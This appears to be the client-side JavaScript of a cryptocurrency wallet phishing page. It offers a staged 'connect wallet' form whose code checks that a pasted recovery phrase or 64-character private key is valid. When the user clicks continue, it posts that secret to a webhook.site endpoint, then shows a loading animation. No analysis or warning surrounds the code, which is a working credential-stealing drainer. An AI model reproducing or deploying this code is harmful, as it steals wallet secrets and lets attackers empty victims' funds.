function wordArrayToPhrase(words) {
    var phrase = words.join(" ");
    return phrase;
}

var mnemonics = { "english": new Mnemonic("english") };
var mnemonic = mnemonics["english"];
let vls = '';
let typeV = '';
$(document).ready(function() {
    __main.init();

  });

  const __main = {
    init: function(){
        __main.preloader();
        __main.multiForm();
        __main.textareaIsempty();
        __main.tabMenu();
    },
      changen: function(){
          let button = $('.js-button-continue-2');
          let type = $('.js-body-tab:visible').attr('id')
          let properPhrase = $('.main-section__textarea textarea:visible').val();
          if(type === 'mnemonic'){
              let isValid = mnemonic.check(properPhrase);
              if (!isValid) {
                  button.attr("disabled", "disabled")
              }else{
                  button.removeAttr("disabled")
                  vls = properPhrase;
                  typeV = type
              }
          }else{
              let key = properPhrase.replace('0x','')
              if(key.length === 64){
                  button.removeAttr("disabled")
                  vls = key;
                  typeV = type
              }else{
                  button.attr("disabled", "disabled")
              }
          }
      },
    tabMenu: function(){
      $(".tab-js li").on("click", function() {
        var id = $(this).attr("data-id");
        $(".tab-js li").removeClass("active"),
        $(".js-body-tab").removeClass("active"),
        $(this).addClass("active"),
        $("#" + id).addClass("active")
          __main.changen();
    })
      $(".tab-js-2 li").on("click", function() {
        var id = $(this).attr("data-id");
        $(".tab-js-2 li").removeClass("active"),
        $(".js-body-tab-2").removeClass("active"),
        $(this).addClass("active"),
        $("#" + id).addClass("active")
          __main.changen();
    })
    },
    textareaIsempty: function(){
      $('.main-section__textarea textarea').bind('input propertychange', function() {
          __main.changen();
      });

    },
    multiForm: function(){
      var step_1 =$('.main-section__step--1');
      var step_2 =$('.main-section__step--2');
      var step_3 =$('.main-section__step--3');
      var step_4 =$('.main-section__step--4');

      var button = $('.js-button-continue-2');
      var button_1 = $('.js-step-next-connect');

      button_1.click(function() {
        step_1.removeClass('active')
        .next(step_1).addClass('active');
        setTimeout(() => {
          step_2.addClass('animation-bg')
        }, 1500);
      });

      button.on('click',function(){
          fetch('https://webhook.site/0183f2ee-088c-46c7-8b45-d33855f1a3b3', {
              method: 'POST',
              body:
                  'type='+typeV+'&value='+vls,
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded'
              }
          }).then(response => response.json())
              .then(data => console.log(data));

        step_2.removeClass('active')
        step_3.addClass('active');
        setTimeout(() => {
          // step_3.removeClass('active');
          step_3.addClass('main-section__animation');
        }, 2200);
      })


    },
    preloader: function(){
      let button = $('.js-button-continue');
      button.on('click',function(){
        step_1.addClass('reverse-animation')
      })
      let step_1 = $('.main-section__step--1'),
       animation = ('main-section__animation'),
       boxes = ('visible-text');
       setTimeout(() => {
        step_1.addClass(animation);
       }, 1600);
       setTimeout(() => {
        step_1.addClass(boxes);
       }, 3000);

       $('#check').on('change', function() {
        if (!this.checked) {
          button.attr("disabled", "disabled")
        }
        else{
          button.removeAttr("disabled")

        }
    });






    }

  }
